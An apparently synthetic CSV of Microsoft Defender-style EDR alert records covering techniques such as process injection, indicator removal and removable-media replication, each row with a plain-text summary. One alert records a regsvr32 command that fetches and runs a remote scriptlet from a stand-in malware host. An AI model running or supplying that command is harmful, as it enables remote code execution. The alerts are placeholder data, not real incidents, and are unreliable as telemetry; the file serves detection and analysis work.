AlertID,creationTimeUtc,AlertTimestamp,severity,category,status,AlertName,AlertDescription,recommendedActions,vendorInformation,properties,AlertCategory,AlertSeverity,Technique,AffectedHost,AffectedProcess,AffectedFilePath,Commandline,ParentProcess,ProcessCommandLine,DetectionMethod,RecommendedActions,source,tactic,device_name,action,file_name,file_size,src_path,dst_path,Severity,Name,Event,AlertType,MachineId,Category,AlertId,EventTime,ExtendedProperties,ComputerName,Status,AlertDetails,EndpointDetails,DetectionSource,DetectionID,EventHash,AffectedEntities,Tactic,KillChainPhase,HostName,FilePath,ProcessName,CommandLine,MD5Hash,SHA256Hash,IPAddress,UserName,ProcessID,ParentProcessID,hostname,ip_address,os,pid,command_line,access_type,operation,DeviceName,DeviceId,OsPlatform,OsVersion,ProcessCreationTime,ParentProcessName,ParentProcessCommandLine,ParentProcessCreationTime,TargetDevice,TargetDeviceId,TargetOsPlatform,TargetOsVersion,TargetUserName,EntityType,EntityName,OS,References,KillChain,MachineDomainName,MachineName,AlertLink,Recommendation,Vendor,Product,Path,Hash,Protocol,SourceIp,SourcePort,DestinationIp,DestinationPort,DomainName,URL,Type,EndpointID,EndpointName,ParentProcessPath,ProcessPath,Source,Host,User,Target,Port,Action,Reason,ProcessPid,ParentProcessPid,Direction,RemoteServiceName,RemoteServiceType,RemoteServicePorts,RemoteServiceIpv4,RemoteServiceIpv6,RemoteServiceUrl,RemoteServiceCertificate,RemoteServiceEncryption,RemoteServiceAuthentication,RemoteServiceVersion,RemoteServiceProduct,RemoteServiceOrganization,TargetUser,OriginalPermissions,NewPermissions,Field,Operator,Value,Tags,InjectedProcessName,InjectionTechnique,ControlName,sha1_hash,file_path,process_name,process_path,HostIP,AdditionalInfo,RegistryKey,RegistryValue,CloudProvider,APIOperation,TECHNIQUE,SourceIPAddress,DestinationIPAddress,Domain,ThreatName,IOC,ProcessHash,Hostname,SourceIP,DestinationIP,AttackType,AttackDuration,AffectedServices,AffectedHostname,AlertSource,alert_severity,action_taken,detection_source,Affected_Hostname,Injected_Process_Name,Parent_Process_Name,Injection_Technique,Alert_Source,machine_id,user_id,process_id,process_command_line,alert_type,alert_name,remote_address,remote_port,local_address,local_port,protocol,RemovableMediaName,RemovableMediaVendor,RemovableMediaType,RemovableMediaSerialNumber,RemovableMediaCapacity,RemovableMediaAccessedTime,RemovableMediaAction,AffectedFileSize,TechniqueName,IP,OSVersion,EventType,EventCategory,TargetResource,Operation,SuspiciousAction,Domain_Controller_IP,Domain_Controller_Name,ParentCommandLine,EventID,ParentHash,ExecutionStatus,EntityValue,Condition,Description,Endpoint,RemediationSteps,EventId,ProcessId,CloudAccount,local_ip,public_ip,detection_method,file_hash,malware_family,TECHNIQUE_NAME,TACTIC,Signer,Process Name,PID,AttackTactic,AttackTechnique,EntityId,EntityIp,Details,TimestampUtc,SHA256,WebServiceName,WebServicePath,type,vendor,path,domain,host,Affected_Device,Affected_User,Malicious_Executable,Username,ContainerImageName,ContainerRuntime,DeploymentMethod,ParentProcessId,AlertDDescription,Endpoint_ID,Endpoint_Name,Endpoint_IP,Process_Name,EndpointIP,C2Server,ExfiltratedData,ExfiltrationMethod,UserDomain,ProcessParentName,ProcessParentID,ArtifactType,ArtifactPath,ArtifactName,AleertDescription,AlertTimestamps,native_function_calls,source_ip,destination_ip,process_hash,parent_process_name,parent_process_hash,Detection_Details,Process_Path,Process_Command_Line,AffectedFile_Path,AlertTime,UserInfo,PhishingInfo,AffectedImagePath,AffectedEndpoints,IndicatorsOfCompromise,Loader_Process_Name,Loader_Technique,ProcessParentPath,ProcessParentHash,ImageLoaded,TargetImageLoaded,TargetImageName,TargetCommandLine,KillchainPhase,TechniqueID,Techniqu,MACAddress,AlertyDescription,EventLogName,EventLogMessage,OperatingSystem,FallbackProtocol,Alertescription,modified_time,original_hash,current_hash,RemoteServer,affected_host,alert_category,alert_recommendation,alert_details,RuleName,ProcessParentCommandLine,AttackVector,AlertTimestampUtc,WebServerUrl,WebServerMethod,technique,remote_ip,ClosedTime,DataTTL,DetectionTime,DetectionType,IsIncident,LastUpdateTime,DnsName,FullyQualifiedDomainName,NetBiosName,OSPlatform,ProcessorArchitecture,CreationTime,End,FileHash,FileName,Start,VendorName,VendorSeverity,VendorThreatName,combined_data
MDE-34567,,2022-10-31T15:20:30Z,High,,,Implant Internal Image,Implant internal image detected on PC-1234,,,,,,,,,,,,,,,,,,,internal_image.dll,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,8bc6ab5d6ec7f21202fc9c9358c62d53e1e7ed1a,C:\Program Files (x86)\MyApp\internal_image.dll,explorer.exe,C:\Windows\explorer.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is MDE-34567. AlertTimestamp is 2022-10-31T15:20:30Z. severity is High. AlertName is Implant Internal Image. AlertDescription is Implant internal image detected on PC-1234. file_name is internal_image.dll. sha1_hash is 8bc6ab5d6ec7f21202fc9c9358c62d53e1e7ed1a. file_path is C:\Program Files (x86)\MyApp\internal_image.dll. process_name is explorer.exe. process_path is C:\Windows\explorer.exe. 
asdfkwkl45,,2023-03-10T17:00:00Z,,,,Indicator Removal,Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses.,,,,,,Indicator Removal,,,,,,,,,,,,,,,,,High,,File Deletion,,,,,,,,,,,,,,,Defense Evasion,,,C:\ProgramData\malware.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,desktop01,user01,,,Blocked,Unauthorized file deletion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is asdfkwkl45. AlertTimestamp is 2023-03-10T17:00:00Z. AlertName is Indicator Removal. AlertDescription is Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses.. Technique is Indicator Removal. Severity is High. Event is File Deletion. Tactic is Defense Evasion. FilePath is C:\ProgramData\malware.exe. Source is Endpoint. Host is desktop01. User is user01. Action is Blocked. Reason is Unauthorized file deletion. 
30405607356,,2023-03-10T18:00:00Z,,,,Indirect Command Execution,Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters.,,,,,,Indirect Command Execution,,,,,,,,,,,,,,,,,Medium,,,,,,,,,,,,,,,,,Execution,,,,regsvr32.exe,regsvr32.exe /s /u /i:http://malware.com/malware.sct scrobj.dll,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,server01,user01,,,Blocked,Unauthorized command execution,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is 30405607356. AlertTimestamp is 2023-03-10T18:00:00Z. AlertName is Indirect Command Execution. AlertDescription is Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters.. Technique is Indirect Command Execution. Severity is Medium. Tactic is Execution. ProcessName is regsvr32.exe. CommandLine is regsvr32.exe /s /u /i:http://malware.com/malware.sct scrobj.dll. Source is Endpoint. Host is server01. User is user01. Action is Blocked. Reason is Unauthorized command execution. 
222221,,2022-03-03T13:42:17Z,,,,Unusual Parent Process,A suspicious parent child process relationship with cmd.exe descending from an unusual process was detected.,,,,,,,,,,,,,,,,,,,,,,,High,Command and Scripting Interpreter,,,,Command and Scripting Interpreter (T1059.003),,,,,,,,EDR,,,,,,DESKTOP-ABC123,,cmd.exe,cmd.exe /c echo 'Hello World',,,,JohnDoe,,,,,,,,,,,,,,,MyCustomProcess.exe,,,,,,,,,,,,['Command and Scripting Interpreter'],,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,"{'ParentProcessName': 'MyCustomProcess.exe', 'ParentProcessPath': 'C:\\Program Files\\MyApp\\MyCustomProcess.exe', 'ParentProcessCommandLine': 'MyCustomProcess.exe /run'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is 222221. AlertTimestamp is 2022-03-03T13:42:17Z. AlertName is Unusual Parent Process. AlertDescription is A suspicious parent child process relationship with cmd.exe descending from an unusual process was detected.. Severity is High. Name is Command and Scripting Interpreter. Category is Command and Scripting Interpreter (T1059.003). DetectionSource is EDR. HostName is DESKTOP-ABC123. ProcessName is cmd.exe. CommandLine is cmd.exe /c echo 'Hello World'. UserName is JohnDoe. ParentProcessName is MyCustomProcess.exe. KillChain are Command and Scripting Interpreter; HostIP is 192.168.1.100. AdditionalInfo ParentProcessName is MyCustomProcess.exe. AdditionalInfo ParentProcessPath is C:\Program Files\MyApp\MyCustomProcess.exe. AdditionalInfo ParentProcessCommandLine is MyCustomProcess.exe /run. 
75668383,,2023-03-10T18:00:00Z,,,,Modify Authentication Process,"Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials.",,,,,,Modify Authentication Process,,,,,,,,,,,,,,,,,Critical,,,,,,,,,,,,,,,,,Defense Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,server01,admin01,,,Blocked,Unauthorized modification of registry key,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon,Userinit,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"AlertID is 75668383. AlertTimestamp is 2023-03-10T18:00:00Z. AlertName is Modify Authentication Process. AlertDescription is Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials.. Technique is Modify Authentication Process. Severity is Critical. Tactic is Defense Evasion. Source is Endpoint. Host is server01. User is admin01. Action is Blocked. Reason is Unauthorized modification of registry key. RegistryKey is HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon. RegistryValue is Userinit. "
39403802,,2023-03-10T19:00:00Z,,,,Modify Cloud Compute Infrastructure,"An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.",,,,,,Modify Cloud Compute Infrastructure,,,,,,,,,,,,,,,,,Critical,,,,,,,,,,,,,,,,,Defense Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,server01,admin01,,,Blocked,Unauthorized modification of cloud compute instance attribute,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AWS,ModifyInstanceAttribute,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"AlertID is 039403802. AlertTimestamp is 2023-03-10T19:00:00Z. AlertName is Modify Cloud Compute Infrastructure. AlertDescription is An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.. Technique is Modify Cloud Compute Infrastructure. Severity is Critical. Tactic is Defense Evasion. Source is Endpoint. Host is server01. User is admin01. Action is Blocked. Reason is Unauthorized modification of cloud compute instance attribute. CloudProvider is AWS. APIOperation is ModifyInstanceAttribute. "
2040506,,2023-03-10T20:00:00Z,,,,Modify System Image,Adversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves.,,,,,,Modify System Image,,,,,,,,,,,,,,,,,Critical,,,,,,,,,,,,,,,,,Defense Evasion,,,C:\Windows\System32\ntoskrnl.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,server01,system,,,Blocked,Unauthorized modification of system file,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is 02040506. AlertTimestamp is 2023-03-10T20:00:00Z. AlertName is Modify System Image. AlertDescription is Adversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves.. Technique is Modify System Image. Severity is Critical. Tactic is Defense Evasion. FilePath is C:\Windows\System32\ntoskrnl.exe. Source is Endpoint. Host is server01. User is system. Action is Blocked. Reason is Unauthorized modification of system file. 
1234567890,,2023-03-10T14:30:00Z,,,,Network Boundary Bridging,Defender for Endpoint EDR has detected network boundary bridging activity in the environment.,,,,,,,,,,,,"C:\Windows\explorer.exe /root,::{20D04FE0-3AEA-1069-A2D8-08002B30309D}\::{21EC2020-3AEA-1069-A2DD-08002B30309D}\::{2227A280-3AEA-1069-A2DE-08002B30309D}",Behavioral Analysis,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,explorer.exe,,,,,,1234,5678,,,,,,,,,,,,,cmd.exe,,,,,,,,,,,,,,,,,,,,,TCP,,,,80,,,,,,C:\Windows\System32\cmd.exe,C:\Windows\explorer.exe,,,EXAMPLE_USER,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Network Boundary Bridging (T1599),192.168.1.100,10.0.0.2,example.com,Network Boundary Bridging,TCP traffic from an internal IP address to an external IP address,ABCD1234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"AlertID is 1234567890. AlertTimestamp is 2023-03-10T14:30:00Z. AlertName is Network Boundary Bridging. AlertDescription is Defender for Endpoint EDR has detected network boundary bridging activity in the environment.. ProcessCommandLine is C:\Windows\explorer.exe /root,::{20D04FE0-3AEA-1069-A2D8-08002B30309D}\::{21EC2020-3AEA-1069-A2DD-08002B30309D}\::{2227A280-3AEA-1069-A2DE-08002B30309D}. DetectionMethod is Behavioral Analysis. Severity is High. ProcessName is explorer.exe. ParentProcessName is cmd.exe. Protocol is TCP. ParentProcessPath is C:\Windows\System32\cmd.exe. ProcessPath is C:\Windows\explorer.exe. User is EXAMPLE_USER. TECHNIQUE is Network Boundary Bridging (T1599). SourceIPAddress is 192.168.1.100. DestinationIPAddress is 10.0.0.2. Domain is example.com. ThreatName is Network Boundary Bridging. IOC is TCP traffic from an internal IP address to an external IP address. ProcessHash is ABCD1234. "
1234567890,,2022-03-09T10:42:11.000Z,,,,Denial of Service,Defender for Endpoint has detected a network denial of service (DoS) attack on the endpoint.,,,,,,,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.101,,,,,,,,,,,,,,,,,,,,,,,,,,Windows 10 Pro,,,,,,,,Microsoft Defender for Endpoint,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,company.local,,,,COMPANY-PC01,10.0.0.2,192.168.1.101,UDP Flood,120 seconds,"HTTP, DNS, FTP",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"AlertID is 1234567890. AlertTimestamp is 2022-03-09T10:42:11.000Z. AlertName is Denial of Service. AlertDescription is Defender for Endpoint has detected a network denial of service (DoS) attack on the endpoint.. Severity is High. IPAddress is 192.168.1.101. OS is Windows 10 Pro. Product is Microsoft Defender for Endpoint. Domain is company.local. Hostname is COMPANY-PC01. SourceIP is 10.0.0.2. DestinationIP is 192.168.1.101. AttackType is UDP Flood. AttackDuration is 120 seconds. AffectedServices is HTTP, DNS, FTP. "
eorof05,,2023-03-10T11:15:00Z,,,,Plist Modification,"Adversaries may modify property list files (plist files) to enable other malicious activity, while also potentially evading and bypassing system defenses.",,,,,,Plist File Modification,,,/Library/LaunchDaemons/com.apple.plist,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Persistence,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Investigate the nature and purpose of the plist modification and remediate accordingly.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,hostname123,Defender for Endpoint EDR,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"AlertID is eorof05. AlertTimestamp is 2023-03-10T11:15:00Z. AlertName is Plist Modification. AlertDescription is Adversaries may modify property list files (plist files) to enable other malicious activity, while also potentially evading and bypassing system defenses.. Technique is Plist File Modification. AffectedFilePath is /Library/LaunchDaemons/com.apple.plist. Severity is High. Tactic is Persistence. Recommendation is Investigate the nature and purpose of the plist modification and remediate accordingly.. AffectedHostname is hostname123. AlertSource is Defender for Endpoint EDR. "
EDR-13579,,2022-10-31T00:00:00Z,,,,Private Key Interception,Private key interception detected on host PC-1234,,,,,,,,,,,,,,,,,,,private_key.pem,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Users\User1\Documents,explorer.exe,,,,,,,,,,,,,,,,,,,,,,,High,File quarantined,Behavior monitoring,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is EDR-13579. AlertTimestamp is 2022-10-31T00:00:00Z. AlertName is Private Key Interception. AlertDescription is Private key interception detected on host PC-1234. file_name is private_key.pem. file_path is C:\Users\User1\Documents. process_name is explorer.exe. alert_severity is High. action_taken is File quarantined. detection_source is Behavior monitoring. 
1350df0e,,2023-03-10T13:30:00Z,,,,Process Injection,Process injection is a method of executing arbitrary code in the address space of a separate live process.,,,,,,Process Injection,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Defense Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Investigate the injected process and parent process to determine the nature and purpose of the injection and remediate accordingly.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,hostname123,explorer.exe,notepad.exe,Thread Execution Hijacking,Defender for Endpoint EDR,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is 1350df0e. AlertTimestamp is 2023-03-10T13:30:00Z. AlertName is Process Injection. AlertDescription is Process injection is a method of executing arbitrary code in the address space of a separate live process.. Technique is Process Injection. Severity is High. Tactic is Defense Evasion. Recommendation is Investigate the injected process and parent process to determine the nature and purpose of the injection and remediate accordingly.. Affected_Hostname is hostname123. Injected_Process_Name is explorer.exe. Parent_Process_Name is notepad.exe. Injection_Technique is Thread Execution Hijacking. Alert_Source is Defender for Endpoint EDR. 
1234567,,2023-03-09T15:45:00Z,,,,Proxy Connection,Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure.,,,,,,,,,,,,,Proxy Detection,"['Investigate the use of a proxy in the environment', 'Identify the source and destination of the proxy traffic', 'Monitor for any further suspicious activity']",,,,,,,,,High,,,Endpoint detection,,,,,,,,,,Network Traffic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is 1234567. AlertTimestamp is 2023-03-09T15:45:00Z. AlertName is Proxy Connection. AlertDescription is Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure.. DetectionMethod is Proxy Detection. RecommendedActions are Investigate the use of a proxy in the environment; Identify the source and destination of the proxy traffic; Monitor for any further suspicious activity; Severity is High. AlertType is Endpoint detection. DetectionSource is Network Traffic. 
defender_endpoint_alert_12345,,2022-01-01T12:34:56.789Z,High,,,RAdmin Tool,Remote access tools (RAdmin) may be installed and used post-compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,machine-12345,user-67890,1234,C:\Program Files (x86)\RAdmin Viewer\rview.exe,RAdmin Tool Used,RAdmin Tool Used to Remotely Control Workstations,192.168.1.100,4899,192.168.1.101,1234,TCP,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is defender_endpoint_alert_12345. AlertTimestamp is 2022-01-01T12:34:56.789Z. severity is High. AlertName is RAdmin Tool. AlertDescription is Remote access tools (RAdmin) may be installed and used post-compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system.. machine_id is machine-12345. user_id is user-67890. process_command_line is C:\Program Files (x86)\RAdmin Viewer\rview.exe. alert_type is RAdmin Tool Used. alert_name is RAdmin Tool Used to Remotely Control Workstations. remote_address is 192.168.1.100. local_address is 192.168.1.101. protocol is TCP. 
0304r95p,,2022-03-04T10:25:00Z,,,,Possible Removable Media Replication,"Agent.btz drops itself onto removable media devices and creates an autorun.inf file with an instruction to run that file. When the device is inserted into another system, it opens autorun.inf and loads the malware.",,,,,,,,,C:\Users\User\Documents\SensitiveData.docx,,,,Endpoint Monitoring,,,,,,,,,,High,,,RemovableMediaDetection,,Endpoint Detection and Response,,,,,,,,,,,,Initial Access,,,,explorer.exe,explorer.exe C:\Users\User\Documents\SensitiveData.docx,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Windows 10,,,,,,,,,,,,,,,,,,,,,,C:\Windows\explorer.exe,,,User,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,DESKTOP-12345,,,,,,,,,,,,,,,,,,,,,,,,,,,USB Device,SanDisk,USB flash drive,123456,16 GB,2022-03-04T10:25:00Z,Copied Files,2 MB,Replication Through Removable Media,192.168.1.2,1909,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"AlertID is 0304r95p. AlertTimestamp is 2022-03-04T10:25:00Z. AlertName is Possible Removable Media Replication. AlertDescription is Agent.btz drops itself onto removable media devices and creates an autorun.inf file with an instruction to run that file. When the device is inserted into another system, it opens autorun.inf and loads the malware.. AffectedFilePath is C:\Users\User\Documents\SensitiveData.docx. DetectionMethod is Endpoint Monitoring. Severity is High. AlertType is RemovableMediaDetection. Category is Endpoint Detection and Response. Tactic is Initial Access. ProcessName is explorer.exe. CommandLine is explorer.exe C:\Users\User\Documents\SensitiveData.docx. OS is Windows 10. ProcessPath is C:\Windows\explorer.exe. User is User. Hostname is DESKTOP-12345. RemovableMediaName is USB Device. RemovableMediaVendor is SanDisk. RemovableMediaType is USB flash drive. RemovableMediaCapacity is 16 GB. RemovableMediaAccessedTime is 2022-03-04T10:25:00Z. RemovableMediaAction is Copied Files. AffectedFileSize is 2 MB. TechniqueName is Replication Through Removable Media. IP is 192.168.1.2. OSVersion is 1909. "
